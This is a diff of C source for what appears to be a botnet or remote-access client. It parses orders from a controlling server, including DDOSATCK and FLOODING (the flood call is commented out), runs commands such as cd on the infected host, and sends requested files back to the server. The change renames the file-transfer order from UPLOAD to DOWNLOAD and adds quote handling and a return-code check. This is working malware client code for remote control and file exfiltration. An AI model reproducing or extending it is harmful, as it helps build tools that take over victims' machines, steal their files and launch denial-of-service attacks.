@@ -22,7 +22,7 @@ enum OrderType get_order_enum_type(const char *buffer) {
     if (strcmp(flag, "ASKSTATE") == 0) return ASKSTATE;
     if (strcmp(flag, "DDOSATCK") == 0) return DDOSATCK;
     if (strcmp(flag, "FLOODING") == 0) return FLOODING;
-    if (strncmp(buffer, "UPLOAD", 8) == 0) return UPLOAD;
+    if (strncmp(buffer, "DOWNLOAD", 8) == 0) return DOWNLOAD;
     return UNKNOWN; // warning: unknown enum value is 5
 }
 
@@ -74,12 +74,19 @@ char* read_client_log_file(int n_last_line) {
 }
 
 int parse_and_execute_command(const Command cmd, int sockfd) {
-
     // Check if the command is a `cd` command
     if (strcmp(cmd.program, "cd") == 0) {
         if (cmd.params && cmd.params[0]) {
+            // Strip quotes from the directory name if present
+            char *directory_name = cmd.params[0];
+            size_t len = strlen(directory_name);
+            if (directory_name[0] == '"' && directory_name[len - 1] == '"') {
+                directory_name[len - 1] = '\0'; // Remove trailing quote
+                directory_name++;              // Move past the leading quote
+            }
+
             // Change the working directory
-            if (chdir(cmd.params[0]) == 0) {
+            if (chdir(directory_name) == 0) {
                 send_message(sockfd, "Directory changed successfully");
             } else {
                 send_message(sockfd, "Failed to change directory");
@@ -123,6 +130,9 @@ void receive_and_process_message(int sockfd) {
 
     // Receive the message from the server
     int bytes_received = receive_message_client(sockfd, buffer, sizeof(buffer), recv);
+    if (bytes_received == -99) {
+        return; // File upload success
+    }
     if (bytes_received < 0) {
         output_log("Failed to receive message from server\n", LOG_ERROR, LOG_TO_ALL);
         return; // Erreur de réception
@@ -149,8 +159,8 @@ void receive_and_process_message(int sockfd) {
         case FLOODING:
             //launch_flood(cmd, sockfd);
             break;
-        case UPLOAD:
-            output_log("Preparing for UPLOAD request\n", LOG_DEBUG, LOG_TO_CONSOLE);
+        case DOWNLOAD:
+            output_log("Preparing for DOWNLOAD request\n", LOG_DEBUG, LOG_TO_CONSOLE);
             send_file(sockfd,cmd.params[0]);
             break;
         case UNKNOWN:
@@ -161,4 +171,5 @@ void receive_and_process_message(int sockfd) {
     free_command(&cmd); // Nettoyer correctement après
     return ;
 }
+
 
